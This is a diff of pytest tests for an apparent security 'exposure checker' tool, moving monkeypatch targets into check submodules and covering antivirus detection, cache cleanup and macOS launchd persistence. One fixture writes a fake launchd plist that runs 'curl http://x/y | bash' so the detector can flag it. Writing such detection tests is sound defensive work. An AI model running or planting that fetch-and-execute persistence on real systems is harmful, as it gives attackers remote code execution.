@@ -58,8 +58,9 @@ class TestSelfInvocation:
         monkeypatch.setattr(sys, "frozen", False, raising=False)
         inv = ec._self_invocation()
         assert inv[0] == sys.executable
-        assert inv[-1].endswith("exposure_checker.py")
-        assert len(inv) == 2
+        assert inv[1] == "-m"
+        assert inv[2] == "exposure_checker"
+        assert len(inv) == 3
 
     def test_frozen_mode_is_executable_only(self, monkeypatch):
         # In a PyInstaller bundle __file__ points into a temp dir that vanishes;
@@ -152,10 +153,10 @@ class TestDefenderFalsePositives:
                  "AntivirusSignatureAge": 0}),
             "Get-MpThreat": "null",
         }
-        monkeypatch.setattr(ec, "_ps", _fake_ps_factory(responses))
-        monkeypatch.setattr(ec, "_check_windows_registry_persistence", lambda r: None)
-        monkeypatch.setattr(ec, "_check_windows_temp_executables", lambda r: None)
-        monkeypatch.setattr(ec, "_check_windows_suspicious_procs", lambda r: None)
+        monkeypatch.setattr(ec.checks.security, "_ps", _fake_ps_factory(responses))
+        monkeypatch.setattr(ec.checks.security, "_check_windows_registry_persistence", lambda r: None)
+        monkeypatch.setattr(ec.checks.security, "_check_windows_temp_executables", lambda r: None)
+        monkeypatch.setattr(ec.checks.security, "_check_windows_suspicious_procs", lambda r: None)
         r = FakeReporter()
         ec._check_malware_windows(r)
         # Norton active → Defender standing down is normal, NOT critical
@@ -171,10 +172,10 @@ class TestDefenderFalsePositives:
                  "AntivirusSignatureAge": 0}),
             "Get-MpThreat": "null",
         }
-        monkeypatch.setattr(ec, "_ps", _fake_ps_factory(responses))
-        monkeypatch.setattr(ec, "_check_windows_registry_persistence", lambda r: None)
-        monkeypatch.setattr(ec, "_check_windows_temp_executables", lambda r: None)
-        monkeypatch.setattr(ec, "_check_windows_suspicious_procs", lambda r: None)
+        monkeypatch.setattr(ec.checks.security, "_ps", _fake_ps_factory(responses))
+        monkeypatch.setattr(ec.checks.security, "_check_windows_registry_persistence", lambda r: None)
+        monkeypatch.setattr(ec.checks.security, "_check_windows_temp_executables", lambda r: None)
+        monkeypatch.setattr(ec.checks.security, "_check_windows_suspicious_procs", lambda r: None)
         r = FakeReporter()
         ec._check_malware_windows(r)
         assert "CRITICAL" in r.severities()
@@ -190,10 +191,10 @@ class TestDefenderFalsePositives:
                  "AntivirusSignatureAge": 1}),
             "Get-MpThreat": "null",   # no active threats
         }
-        monkeypatch.setattr(ec, "_ps", _fake_ps_factory(responses))
-        monkeypatch.setattr(ec, "_check_windows_registry_persistence", lambda r: None)
-        monkeypatch.setattr(ec, "_check_windows_temp_executables", lambda r: None)
-        monkeypatch.setattr(ec, "_check_windows_suspicious_procs", lambda r: None)
+        monkeypatch.setattr(ec.checks.security, "_ps", _fake_ps_factory(responses))
+        monkeypatch.setattr(ec.checks.security, "_check_windows_registry_persistence", lambda r: None)
+        monkeypatch.setattr(ec.checks.security, "_check_windows_temp_executables", lambda r: None)
+        monkeypatch.setattr(ec.checks.security, "_check_windows_suspicious_procs", lambda r: None)
         r = FakeReporter()
         ec._check_malware_windows(r)
         assert not any("Active threat" in f["label"] for f in r.findings)
@@ -202,14 +203,14 @@ class TestDefenderFalsePositives:
         # productState 0x10000 has the 0x1000 'enabled' nibble set.
         responses = {"AntiVirusProduct": json.dumps(
             {"displayName": "Bitdefender", "productState": 0x11000})}
-        monkeypatch.setattr(ec, "_ps", _fake_ps_factory(responses))
+        monkeypatch.setattr(ec.checks.security, "_ps", _fake_ps_factory(responses))
         assert ec._win_third_party_av() == ["Bitdefender"]
 
     def test_disabled_third_party_av_ignored(self, monkeypatch):
         # 0x01000 has the enabled nibble clear → not counted as active.
         responses = {"AntiVirusProduct": json.dumps(
             {"displayName": "Old AV", "productState": 0x00000})}
-        monkeypatch.setattr(ec, "_ps", _fake_ps_factory(responses))
+        monkeypatch.setattr(ec.checks.security, "_ps", _fake_ps_factory(responses))
         assert ec._win_third_party_av() == []
 
 
@@ -231,9 +232,9 @@ class TestCacheDiscovery:
         big = tmp_path / "ChromeCache"
         big.mkdir()
         (big / "blob").write_bytes(b"\x00" * (160 * 1024 * 1024))  # 160 MB
-        monkeypatch.setattr(ec, "_browser_cache_dirs",
+        monkeypatch.setattr(ec.checks.cleaner, "_browser_cache_dirs",
                             lambda: [("Chrome", str(big))])
-        monkeypatch.setattr(ec, "_dev_cache_dirs", lambda: [])
+        monkeypatch.setattr(ec.checks.cleaner, "_dev_cache_dirs", lambda: [])
         r = FakeReporter()
         n = ec._cleaner_common_caches(r)
         assert n == 1
@@ -243,9 +244,9 @@ class TestCacheDiscovery:
         small = tmp_path / "ChromeCache"
         small.mkdir()
         (small / "blob").write_bytes(b"\x00" * (1024 * 1024))  # 1 MB
-        monkeypatch.setattr(ec, "_browser_cache_dirs",
+        monkeypatch.setattr(ec.checks.cleaner, "_browser_cache_dirs",
                             lambda: [("Chrome", str(small))])
-        monkeypatch.setattr(ec, "_dev_cache_dirs", lambda: [])
+        monkeypatch.setattr(ec.checks.cleaner, "_dev_cache_dirs", lambda: [])
         r = FakeReporter()
         assert ec._cleaner_common_caches(r) == 0
 
@@ -310,7 +311,7 @@ class TestMacPersistence:
             b"<plist><dict><key>ProgramArguments</key><array>"
             b"<string>/bin/bash</string><string>-c</string>"
             b"<string>curl http://x/y | bash</string></array></dict></plist>")
-        monkeypatch.setattr(ec, "_MAC_LAUNCHD_DIRS", [str(tmp_path)])
+        monkeypatch.setattr(ec.checks.security, "_MAC_LAUNCHD_DIRS", [str(tmp_path)])
         r = FakeReporter()
         n = ec._check_launchd_persistence_macos(r)
         assert n == 1
@@ -322,7 +323,7 @@ class TestMacPersistence:
             b"<plist><dict><key>ProgramArguments</key><array>"
             b"<string>/Applications/Thing.app/Contents/MacOS/thing</string>"
             b"</array></dict></plist>")
-        monkeypatch.setattr(ec, "_MAC_LAUNCHD_DIRS", [str(tmp_path)])
+        monkeypatch.setattr(ec.checks.security, "_MAC_LAUNCHD_DIRS", [str(tmp_path)])
         r = FakeReporter()
         assert ec._check_launchd_persistence_macos(r) == 0
 
